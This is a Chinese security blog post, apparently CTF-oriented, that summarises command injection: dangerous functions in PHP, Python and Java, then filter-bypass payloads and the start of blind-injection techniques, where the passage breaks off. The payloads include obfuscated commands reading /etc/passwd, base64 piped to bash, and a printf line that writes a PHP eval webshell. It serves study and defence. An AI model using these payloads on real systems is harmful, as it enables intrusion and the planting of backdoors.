@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <title>
+        命令注入总结 |
+        
+        A.M.|P.M.
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","img_position":"left","left_side_width":"260px","content_max_width":"900px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"version":"3.0.4"};
+    KEEP.language = {"search":"Search...","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"Powered by %s","theme":"Theme","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","tagcloud":"Tag Cloud","comment":"Comment","home":"Home","archive":"Archive","archives":"Archives","about":"About","site_uv":"Visitor Count","site_pv":"Totalview","links":"Links","link":"Link","top":"TOP","read_more":"Read more","wordcount":"Words","min2read":"Mins","changelog":"Changelog","copyright":{"author":"Post author","title":"Post title","link":"Post link","create_time":"Create time","license_title":"Copyright Notice","license_content":"All articles in this blog are licensed under %s unless stating additionally."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"}};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="page-container">
+
+    
+
+    <header class="page-header">
+        <div class="header-progress"></div>
+    </header>
+
+    <main class="page-main">
+
+        <div class="page-main-content">
+
+            <div class="page-main-content-top">
+                <header class="header-wrapper">
+
+    <div class="header-content">
+        <a class="logo-title" href="/">
+            A.M.|P.M.
+        </a>
+
+        <ul class="menu-list">
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/"
+                    >
+                        HOME
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/archives"
+                    >
+                        ARCHIVES
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/categories"
+                    >
+                        CATEGORIES
+                    </a>
+                </li>
+            
+        </ul>
+
+        <div class="menu-bar">
+            <div class="menu-bar-middle"></div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+            </div>
+
+            <div class="page-main-content-middle">
+
+                <main class="main-content normal-code-theme">
+
+                    
+                        <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">命令注入总结</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span>John_Frod</span>
+                        <span class="level">Lv3</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-calendar"></i> 2021-03-29 15:28:04
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-%E6%89%A7%E8%A1%8C/">命令注入/执行</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="命令注入总结"><a href="#命令注入总结" class="headerlink" title="命令注入总结"></a>命令注入总结</h1><p>命令注入是通过易受攻击的应用程序在主机操作系统上执行任意命令。在此攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的权限执行。 命令注入攻击很可能主要是由于输入验证不足。此攻击与代码注入不同，因为代码注入允许攻击者添加自己的代码，然后由应用程序执行。 在命令注入中，攻击者扩展了执行系统命令的应用程序的默认功能，而无需注入代码。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当应用程序将不安全的用户提供的数据（表单，cookie，HTTP标头等）不经过检查过滤就传递给系统shell时，可能会发生命令注入攻击。 </p>
+<h2 id="常见的危险函数"><a href="#常见的危险函数" class="headerlink" title="常见的危险函数"></a>常见的危险函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>执行 <code>command</code> 参数所指定的命令， 并且输出执行结果。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system ( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> = ? ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
+<p>command：要执行的命令。</p>
+<p>return_var：如果提供 <code>return_var</code> 参数， 则外部命令执行后的返回状态将会被设置到此变量中。</p>
+<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><p>执行 <code>command</code> 参数所指定的命令。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec ( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">array</span> &amp;<span class="variable">$output</span> = ? , <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> = ? ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
+<p>command：要执行的命令。</p>
+<p>output：如果提供了 <code>output</code> 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 </p>
+<p>return_var：如果同时提供 <code>output</code> 和 <code>return_var</code> 参数， 命令执行后的返回状态会被写入到此变量。</p>
+<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><p>执行 <code>command</code> 参数所指定的命令并且显示原始输出。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru ( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> = ? ) : <span class="keyword">void</span></span><br></pre></td></tr></table></figure>
+<p>command：要执行的命令。</p>
+<p>return_var：如果提供 <code>return_var</code> 参数， Unix 命令的返回状态会被记录到此参数。</p>
+<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h4><p>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell_exec ( <span class="keyword">string</span> <span class="variable">$cmd</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
+<p>cmd：要执行的命令。</p>
+<h4 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h4><p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen ( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">string</span> <span class="variable">$mode</span> ) : resource</span><br></pre></td></tr></table></figure>
+<p>command：命令。</p>
+<p>mode：模式。</p>
+<h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h4><p>执行一个命令，并且打开用来输入/输出的文件指针。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc_open ( <span class="keyword">string</span> <span class="variable">$cmd</span> , <span class="keyword">array</span> <span class="variable">$descriptorspec</span> , <span class="keyword">array</span> &amp;<span class="variable">$pipes</span> , <span class="keyword">string</span> <span class="variable">$cwd</span> = <span class="literal">null</span> , <span class="keyword">array</span> <span class="variable">$env</span> = <span class="literal">null</span> , <span class="keyword">array</span> <span class="variable">$other_options</span> = <span class="literal">null</span> ) : resource</span><br></pre></td></tr></table></figure>
+<p>cmd：要执行的命令</p>
+<p>descriptorspec：一个索引数组。 数组的键表示描述符，数组元素值表示 PHP 如何将这些描述符传送至子进程。 0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。</p>
+<p>pipes：将被置为索引数组， 其中的元素是被执行程序创建的管道对应到 PHP 这一端的文件指针。</p>
+<p>cwd：要执行命令的初始工作目录。 必须是 <em>绝对</em> 路径， 设置此参数为 <strong><code>null</code></strong> 表示使用默认值（当前 PHP 进程的工作目录）。</p>
+<p>env：要执行的命令所使用的环境变量。 设置此参数为 <strong><code>null</code></strong> 表示使用和当前 PHP 进程相同的环境变量。</p>
+<p>other_options：你还可以指定一些附加选项。 目前支持的选项包括：</p>
+<ul>
+<li><code>suppress_errors</code> （仅用于 Windows 平台）： 设置为 <strong><code>true</code></strong> 表示抑制本函数产生的错误。</li>
+<li><code>bypass_shell</code> （仅用于 Windows 平台）： 设置为 <strong><code>true</code></strong> 表示绕过 <code>cmd.exe</code> shell。</li>
+</ul>
+<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>PHP 支持一个执行运算符：反引号(``)。PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。效果和 shell_exec() 相同。</p>
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><h4 id="system-1"><a href="#system-1" class="headerlink" title="system"></a>system</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(command)</span><br></pre></td></tr></table></figure>
+<p>在子 shell 中执行命令（字符串）。在 Unix 上，返回值是进程的退出状态；在 Windows 上，返回值是运行 <em>command</em> 后系统 Shell 返回的值。</p>
+<h4 id="popen-1"><a href="#popen-1" class="headerlink" title="popen"></a>popen</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen(cmd, mode=<span class="string">&#x27;r&#x27;</span>, buffering=-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>打开一个管道，它通往 / 接受自命令 <em>cmd</em>。返回值是连接到管道的文件对象，根据 <em>mode</em> 是 <code>&#39;r&#39;</code> （默认）还是 <code>&#39;w&#39;</code> 决定该对象可以读取还是写入。</p>
+<h4 id="subprocess-call-subprocess-run"><a href="#subprocess-call-subprocess-run" class="headerlink" title="subprocess.call/subprocess.run"></a>subprocess.call/subprocess.run</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subprocess.call(args, *, stdin=<span class="literal">None</span>, stdout=<span class="literal">None</span>, stderr=<span class="literal">None</span>, shell=<span class="literal">False</span>, cwd=<span class="literal">None</span>, timeout=<span class="literal">None</span>, **other_popen_kwargs)</span><br></pre></td></tr></table></figure>
+<p>运行由 <em>args</em> 所描述的命令。 等待命令完成，然后返回 <code>returncode</code>属性。</p>
+<h4 id="spawn"><a href="#spawn" class="headerlink" title="spawn"></a>spawn</h4><p>创建新进程以执行命令</p>
+<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><h4 id="java-lang-Runtime-getRuntime-exec-command"><a href="#java-lang-Runtime-getRuntime-exec-command" class="headerlink" title="java.lang.Runtime.getRuntime().exec(command)"></a>java.lang.Runtime.getRuntime().exec(command)</h4><h2 id="Linux下常用的符号"><a href="#Linux下常用的符号" class="headerlink" title="Linux下常用的符号"></a>Linux下常用的符号</h2><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><table>
+<thead>
+<tr>
+<th>符号</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A;B</td>
+<td>A不论正确与否都会执行B命令</td>
+</tr>
+<tr>
+<td>A&amp;B</td>
+<td>A后台运行，A和B同时执行</td>
+</tr>
+<tr>
+<td>A&amp;&amp;B</td>
+<td>A执行成功的时候才会执行B命令</td>
+</tr>
+<tr>
+<td>A|B</td>
+<td>A执行的输出结果，作为B命令的参数，A不论正确与否都会执行B命令</td>
+</tr>
+<tr>
+<td>A||B</td>
+<td>A执行失败后才会执行B命令</td>
+</tr>
+<tr>
+<td>()</td>
+<td>群指令组，用括号将一串连续指令括起来，执行的效果等同于多个独立的命令单独执行的效果。</td>
+</tr>
+<tr>
+<td>(())</td>
+<td>用于算数运算’，与 let 指令相似</td>
+</tr>
+<tr>
+<td>{}</td>
+<td>拼接字符用法，{xx,yy,zz…}{aa,bb,cc…}得到xxaa,xxbb,xxcc,yyaa,yybb,yycc,zzaa,zzbb,zzcc…</td>
+</tr>
+<tr>
+<td>[]</td>
+<td>在流程控制中扮演判断式的作用；在正则表达式中担任类似 “范围” 或 “集合” 的角色。</td>
+</tr>
+<tr>
+<td>[[ ]]</td>
+<td>这组符号与先前的<code>[]</code> 符号，基本上作用相同，但她允许在其中直接使用`</td>
+</tr>
+</tbody></table>
+<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><table>
+<thead>
+<tr>
+<th align="left">字符</th>
+<th align="left">解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">*</td>
+<td align="left">匹配任意长度任意字符</td>
+</tr>
+<tr>
+<td align="left">?</td>
+<td align="left">匹配任意单个字符</td>
+</tr>
+<tr>
+<td align="left">[list]</td>
+<td align="left">匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</td>
+</tr>
+<tr>
+<td align="left">[^list]</td>
+<td align="left">匹配指定范围外的任意单个字符或字符集合</td>
+</tr>
+<tr>
+<td align="left">[!list]</td>
+<td align="left">同<code>[^list]</code></td>
+</tr>
+<tr>
+<td align="left">{str1,str2,…}</td>
+<td align="left">匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</td>
+</tr>
+<tr>
+<td align="left">IFS</td>
+<td align="left">由 &lt; space &gt; 或 &lt; tab &gt; 或 &lt; enter &gt; 三者之一组成</td>
+</tr>
+<tr>
+<td align="left">CR</td>
+<td align="left">由 &lt; enter &gt; 产生</td>
+</tr>
+<tr>
+<td align="left">!</td>
+<td align="left">执行 history 中的命令</td>
+</tr>
+</tbody></table>
+<h2 id="常用绕过"><a href="#常用绕过" class="headerlink" title="常用绕过"></a>常用绕过</h2><h3 id="命令分隔与执行多条命令"><a href="#命令分隔与执行多条命令" class="headerlink" title="命令分隔与执行多条命令"></a>命令分隔与执行多条命令</h3><ul>
+<li>在Unix上:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%0a</span><br><span class="line">%0d </span><br><span class="line">;</span><br><span class="line">&amp;</span><br><span class="line">|</span><br><span class="line">$(shell_command)</span><br><span class="line">&#96;shell_command&#96;</span><br><span class="line">&#123;shell_command,&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在Windows上：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%0a</span><br><span class="line">&amp;</span><br><span class="line">|</span><br><span class="line">%1a - 一个神奇的角色，作为.bat文件中的命令分隔符</span><br></pre></td></tr></table></figure>
+<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><ul>
+<li>使用<code>&lt;</code>或者<code>&lt;&gt;</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;&gt;flag</span><br><span class="line">cat&lt;flag</span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用<code>IFS</code></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS<span class="variable">$9</span>/flag</span><br><span class="line">cat<span class="variable">$&#123;IFS&#125;</span>/flag</span><br><span class="line">cat<span class="variable">$IFS</span>/flag</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>​    在<code>url</code>的编码绕过</p>
+</li>
+<li><p>花括号拓展<code>&#123;OS_COMMAND,ARGUMENT&#125;</code></p>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat,/etc/passwd</span><br></pre></td></tr></table></figure>
+<ul>
+<li>变量控制</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X=$&#x27;cat\x20/flag&#x27;&amp;&amp;$X</span><br><span class="line">X=$&#x27;cat\x09/flag&#x27;&amp;&amp;$X</span><br></pre></td></tr></table></figure>
+<h3 id="绕过-escapeshellcmd"><a href="#绕过-escapeshellcmd" class="headerlink" title="绕过 escapeshellcmd"></a>绕过 escapeshellcmd</h3><ul>
+<li>win下执行bat</li>
+</ul>
+<p>win下执行.bat文件的时候，利用%1a，可以绕过过滤执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;..&#x2F; %1a whoami</span><br></pre></td></tr></table></figure>
+<ul>
+<li>宽字节注入</li>
+</ul>
+<p>php5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escapeshellcmd(<span class="string">&quot;echo &quot;</span>.chr(<span class="number">0xc0</span>).<span class="string">&quot;;id&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>之后该语句会变成</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> 繺;id</span><br></pre></td></tr></table></figure>
+<p>从而实现 id 命令的注入。</p>
+<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><blockquote>
+<p>PHP表示字符串方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;foo&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">string</span>)<span class="string">&quot;bar&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">string</span>)hello;</span><br><span class="line"><span class="keyword">echo</span> (world);</span><br></pre></td></tr></table></figure>
+</blockquote>
+<ul>
+<li>拼接</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=flag;$a<span class="variable">$b</span> <span class="variable">$c</span></span><br><span class="line">(sy.(st).em)(whoami)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>利用已存在的资源</li>
+</ul>
+<p>从已有的文件或者环境变量中获得相应的字符。</p>
+<ul>
+<li>编码</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d|bash</span><br><span class="line">(<span class="built_in">printf</span> <span class="string">&quot;\x63\x61\x74\x20\x66\x6c\x61\x67&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;</span></span><br><span class="line">&#123;<span class="built_in">printf</span>,<span class="string">&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;</span>&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
+<ul>
+<li>单引号、双引号</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c<span class="string">&quot;&quot;</span>at fl<span class="string">&#x27;&#x27;</span>ag</span><br><span class="line">c<span class="string">&#x27;a&#x27;</span>t f<span class="string">&#x27;l&#x27;</span>ag</span><br></pre></td></tr></table></figure>
+<ul>
+<li>反斜线<code> \</code></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
+<ul>
+<li>通配符</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="keyword">in</span>/?s =&gt; ls</span><br><span class="line">cat fl[0-z]g</span><br><span class="line"><span class="built_in">echo</span> d&#123;a,e,i,u,o&#125;g =&gt; dag deg dig dug dog</span><br><span class="line"><span class="built_in">echo</span> &#123;fl,fla&#125;&#123;ag,g&#125; =&gt; flag flg flaag flag</span><br><span class="line"><span class="built_in">echo</span> fl&#123;0..z&#125;g =&gt; fl1g,fl2g,...,flyg,flzg</span><br></pre></td></tr></table></figure>
+<ul>
+<li>未定义变量</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat<span class="variable">$x</span> /etc/passwd</span><br></pre></td></tr></table></figure>
+<ul>
+<li>可变函数</li>
+</ul>
+<p>获取内置函数 system 的索引后，直接执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.先获取system函数的索引</span></span><br><span class="line">php -r <span class="string">&#x27;get_defined_functions();&#x27;</span> | grep <span class="string">&#x27;system&#x27;</span></span><br><span class="line"><span class="comment">#2.直接使用system函数执行</span></span><br><span class="line">php -r get_defined_functions()[501](whoami)<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>$@</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c<span class="variable">$@at</span> fl<span class="variable">$@ag</span></span><br><span class="line"><span class="built_in">echo</span> i<span class="variable">$@d</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>利用已经存在的资源</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>| cut -c 1</span><br><span class="line">/</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>| cut -c 1-4</span><br><span class="line">/usr</span><br></pre></td></tr></table></figure>
+<ul>
+<li>字符数组</li>
+</ul>
+<p>在 php 中可以用数组的形式取到字符串的每一个字符，这样我们就可以先定义一个包含所有需要的字符的字符串，然后通过下标取到字符再拼接的方式构造出我们需要的字符串。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 相当于执行(system)(ls /tmp)</span></span><br><span class="line">php -r <span class="string">&#x27;$a=&quot;elmsty/ &quot;;($a[3].$a[5].$a[3].$a[4].$a[0].$a[2])($a[1].$a[3].$a[-1].$a[-2].tmp)&#x27;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>利用一些已有字符<ul>
+<li>${PS2} 对应字符 <code>&gt;</code></li>
+<li>${PS4} 对应字符 <code>+</code></li>
+<li>${IFS} 对应 内部字段分隔符</li>
+<li>${9} 对应 空字符串</li>
+</ul>
+</li>
+</ul>
+<h3 id="字符数限制绕过"><a href="#字符数限制绕过" class="headerlink" title="字符数限制绕过"></a>字符数限制绕过</h3><p>使用输出重定向<code>&gt;</code>分步把要执行的命令输入到一个文件中，然后再通过<code>sh</code>执行这个文件</p>
+<h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><h5 id="短命令执行"><a href="#短命令执行" class="headerlink" title="短命令执行"></a>短命令执行</h5><p>首先按照前面的<code>&gt;</code>的用法，我们可以知道有标准输出可以输出到文件</p>
+<ol>
+<li>只用<code>\</code>分行输入，这个优点是可以不用考虑时间顺序，直接用<code>ls&gt;a</code>输出到<code>a</code>文件</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># &gt;ec\</span></span><br><span class="line">&gt; ho\</span><br><span class="line">&gt; \ 1</span><br><span class="line">root@kali:~/Desktop<span class="comment"># ls &gt;a</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># cat a</span></span><br><span class="line">a</span><br><span class="line"><span class="built_in">echo</span> 1</span><br><span class="line">root@kali:~/Desktop<span class="comment"># sh a</span></span><br><span class="line">a: 1: a: not found</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<p>这里把<code>echo 1</code>作为字符串输出到桌面，再使用<code>ls</code>命令将桌面的内容储存到<code>a</code>文件中，再执行<code>a</code>文件的内容，输出<code>1</code>。</p>
+<ol start="2">
+<li>使用<code>\\</code>，这种方法是利用<code>\</code>来拼接字符串，其中前一个<code>\</code>是用来转义后一个<code>\</code>的。这里需要考虑时间顺序，需要逆序来创建文件。</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># &gt;\ 1\\</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># &gt;ho\\</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># &gt;ec\\</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># ls -t&gt;a</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># cat a</span></span><br><span class="line">a</span><br><span class="line">ec\</span><br><span class="line">ho\</span><br><span class="line"> 1\</span><br><span class="line">root@kali:~/Desktop<span class="comment"># sh a</span></span><br><span class="line">a: 1: a: not found</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<ul>
+<li>-t 将文件依建立时间之先后次序列出</li>
+</ul>
+<h2 id="无回显的命令注入"><a href="#无回显的命令注入" class="headerlink" title="无回显的命令注入"></a>无回显的命令注入</h2><p>我们之前提到的大部分都是有回显或者一部分提示的命令注入，当我们遇到无回显的命令注入的时候我们又要怎么办呢？</p>
+<h3 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h3><ul>
+<li>首先我们可以通过<code>sleep</code>命令根据返回的时间来判断是否存在命令执行漏洞。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;sleep 5</span><br></pre></td></tr></table></figure>
+<p>若存在命令执行则会等待5秒才返回响应。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210329114110956.png" alt="image-20210329114110956"></p>
+<ul>
+<li>使用sleep来进行盲注</li>
